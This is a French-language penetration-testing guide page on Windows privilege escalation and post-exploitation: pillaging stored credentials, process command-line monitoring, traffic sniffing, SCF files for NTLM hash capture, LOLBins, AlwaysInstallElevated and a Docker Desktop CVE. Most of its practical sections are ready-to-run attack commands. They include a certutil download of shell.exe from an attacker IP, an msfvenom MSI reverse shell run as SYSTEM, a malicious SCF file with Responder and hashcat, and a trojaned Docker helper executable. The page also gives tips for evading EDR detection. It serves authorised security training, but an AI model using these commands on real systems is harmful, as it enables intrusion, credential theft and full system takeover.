# Techniques complementaires

Au-dela des vecteurs classiques (privileges, services, credentials), plusieurs techniques d'escalade reposent sur l'interaction avec les utilisateurs, l'exploitation des binaires Windows legitimes (LOLBins) et les politiques d'installation. Cette page couvre le pillaging, les techniques d'interaction utilisateur et les methodes d'exploitation moins conventionnelles.

## Pourquoi

Quand les configurations sont propres et les credentials introuvables, il reste des vecteurs qui reposent sur l'environnement applicatif et le comportement des utilisateurs. Un partage reseau frequente, un processus qui passe des credentials en argument, une politique d'installation elevee, tout peut devenir un vecteur si on sait ou chercher.

## Comment ca marche

### Pillaging

Le pillaging est la collecte d'informations sur un systeme compromis. Au-dela des credentials, on cherche des informations sur l'infrastructure, les connexions aux autres systemes, les configurations d'applications sensibles.

| Application | Donnees extractibles |
|---|---|
| **mRemoteNG** | Connexions sauvegardees (RDP, SSH, VNC) avec credentials chiffres |
| **OpenVPN** | Fichiers de configuration avec cles et certificats |
| **PuTTY / WinSCP** | Sessions sauvegardees avec mots de passe |
| **TeamViewer** | Credentials dans le registre |
| **FileZilla** | Fichiers `.xml` avec serveurs et credentials en clair |
| **Slack / Teams** | Tokens de session, conversations avec des informations sensibles |

### Interaction avec les utilisateurs

Quand on a un acces sur un systeme ou d'autres utilisateurs sont actifs, on peut exploiter leur activite.

| Technique | Principe |
|---|---|
| **Capture de trafic** | Wireshark/tcpdump pour intercepter des credentials en clair (FTP, HTTP, LDAP) |
| **Monitoring de processus** | Surveiller les lignes de commande des processus pour capturer des credentials |
| **Fichiers SCF sur un partage** | Forcer une authentification NTLM via un fichier SCF sur un partage frequente |
| **Fichiers malveillants** | `.url`, `.lnk`, `.library-ms` places sur des partages pour capturer des hashes |

### LOLBins (Living Off The Land Binaries)

Le projet LOLBAS documente les binaires signes Microsoft qui peuvent etre utilises pour des operations offensives : transfert de fichiers, execution de code, persistance, bypass UAC.

| Binaire | Usage offensif |
|---|---|
| `certutil.exe` | Telechargement de fichiers, encodage/decodage base64 |
| `rundll32.exe` | Execution de DLL (reverse shell via DLL hebergee) |
| `mshta.exe` | Execution de HTA (HTML Application) |
| `regsvr32.exe` | Execution de code via un scriptlet COM |
| `bitsadmin.exe` | Telechargement de fichiers en arriere-plan |
| `cmstp.exe` | Bypass AppLocker et UAC |

### Always Install Elevated

Si la politique "Always Install Elevated" est active dans les Group Policy (a la fois dans `HKCU` et `HKLM`), tout fichier `.msi` sera installe avec des privileges SYSTEM, quel que soit l'utilisateur qui le lance.

## En pratique

### Pillaging : extraction de sessions mRemoteNG

```powershell
# - Localiser le fichier de configuration mRemoteNG
dir /S /B C:\Users\*\AppData\Roaming\mRemoteNG\confCons.xml

# - Le fichier contient les connexions avec des mots de passe chiffres
# Format : <Node ... Password="..." Protocol="RDP" ...>

# - Dechiffrer avec mremoteng-decrypt (Python)
python3 mremoteng_decrypt.py -s "<password_chiffre>"
```

### Monitoring de commandes (capture de credentials)

```powershell
# - Script de monitoring des processus
while($true) {
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}

# Resultats typiques :
# net use T: \\sql02\backups /user:inlanefreight\sqlsvc My4dm1nP@s5w0Rd
# runas /user:admin "cmd.exe"
```

{% hint style="success" %}
Lancer ce script en arriere-plan pendant toute la duree de l'evaluation. Les taches planifiees, les scripts d'administration et les connexions de lecteurs reseau passent souvent des credentials en clair sur la ligne de commande.
{% endhint %}

### Capture de trafic

```powershell
# - Si Wireshark est installe (verifier l'installation de Npcap)
# L'option "Restrict Npcap driver access to Administrators" n'est pas
# activee par defaut, ce qui permet a des utilisateurs non privilegies
# de capturer du trafic

# - Lancer une capture
# Filtrer sur les protocoles en clair : FTP, HTTP, LDAP, SMTP

# - Avec net-creds sur la machine attaquante
python3 net-creds.py -i eth0
# Capture automatique des credentials en clair sur l'interface
```

### Fichier SCF sur un partage

```bash
# - Creer un fichier SCF malveillant
# Contenu du fichier @Inventory.scf :
[Shell]
Command=2
IconFile=\\<IP_ATTAQUANT>\share\icon.ico
[Taskbar]
Command=ToggleDesktop
```

```bash
# - Deposer le fichier sur un partage accessible en ecriture
# Le '@' en debut de nom force l'affichage en haut du repertoire

# - Lancer Responder pour capturer les hashes NTLM
sudo responder -I tun0

# Quand un utilisateur ouvre le dossier dans l'Explorateur,
# Windows tente de charger l'icone via SMB et envoie le hash NTLMv2

# - Cracker le hash offline
hashcat -m 5600 hash.txt /opt/wordlists/rockyou.txt
```

{% hint style="info" %}
Les fichiers `.scf` sont charges automatiquement par l'Explorateur Windows. Il suffit qu'un utilisateur ouvre le dossier contenant le fichier pour declencher l'authentification SMB. Pas besoin de double-cliquer sur le fichier.
{% endhint %}

### LOLBins : transfert de fichiers avec certutil

```cmd
# - Telecharger un fichier
certutil.exe -urlcache -split -f http://<IP_ATTAQUANT>:8080/shell.exe C:\Temp\shell.exe

# - Encoder un fichier en base64
certutil -encode sensitive.doc encoded.txt

# - Decoder un fichier base64
certutil -decode encoded.txt sensitive.doc
```

### Always Install Elevated

{% tabs %}
{% tab title="Detection" %}
```powershell
# - Verifier dans HKCU
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# AlwaysInstallElevated    REG_DWORD    0x1

# - Verifier dans HKLM
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
# AlwaysInstallElevated    REG_DWORD    0x1

# Les DEUX cles doivent etre a 1 pour que la politique soit active
```
{% endtab %}
{% tab title="Exploitation" %}
```bash
# - Generer un MSI malveillant avec msfvenom
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP_ATTAQUANT> LPORT=443 -f msi -o shell.msi

# - Transferer sur la cible et executer
msiexec /i C:\Temp\shell.msi /quiet /qn /norestart

# Le MSI s'installe avec les privileges SYSTEM
# Reverse shell en tant que SYSTEM
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
Always Install Elevated est rarement active en production, mais quand c'est le cas, l'exploitation est triviale et donne un shell SYSTEM immediat. C'est une verification rapide a faire systematiquement.
{% endhint %}

### Techniques Docker Desktop (CVE-2019-15752)

```cmd
# - Verifier la version de Docker Desktop
docker --version
# Docker version 2.0.0.3 (vulnerable si < 2.1.0.1)

# - Le repertoire C:\PROGRAMDATA\DockerDesktop\version-bin\ est
# writable par BUILTIN\Users

# - Placer un executable malveillant
copy C:\Temp\shell.exe "C:\PROGRAMDATA\DockerDesktop\version-bin\docker-credential-wincred.exe"

# L'executable sera lance au demarrage de Docker
# ou quand un utilisateur execute "docker login"
```

## Pieges et galeres

- **SCF et SMB signing** : si le SMB signing est active sur la cible, les hashes captures via un fichier SCF ne pourront pas etre relayes (mais restent crackables offline)
- **Wireshark et permissions** : la capture de trafic avec Wireshark fonctionne uniquement si Npcap a ete installe sans l'option de restriction aux administrateurs
- **Always Install Elevated** : les deux cles de registre (HKCU et HKLM) doivent etre a 1. Si une seule est a 1, la politique n'est pas active
- **Monitoring de processus et bruit** : le script de monitoring genere des evenements reguliers. Sur un systeme surveille par un EDR, cela peut declencher des alertes
- **LOLBins et detection** : les EDR modernes detectent les usages offensifs courants de certutil, mshta et rundll32. Varier les techniques ou utiliser des LOLBins moins connus
- **Fichiers sur partage et nettoyage** : toujours supprimer les fichiers SCF ou malveillants deposes sur les partages apres l'evaluation

## Memo express

| Technique | Commande / Outil |
|---|---|
| Monitoring de processus | Script PowerShell `Get-WmiObject Win32_Process` en boucle |
| Fichier SCF | `@Inventory.scf` avec `IconFile=\\<IP>\share\icon.ico` |
| Capture de hashes | `sudo responder -I tun0` |
| Telechargement LOLBin | `certutil.exe -urlcache -split -f <url> <dest>` |
| Always Install Elevated | `reg query HKCU\...\Installer /v AlwaysInstallElevated` |
| Exploitation MSI | `msiexec /i shell.msi /quiet /qn /norestart` |
| Pillaging mRemoteNG | `mremoteng_decrypt.py -s "<password>"` |

***
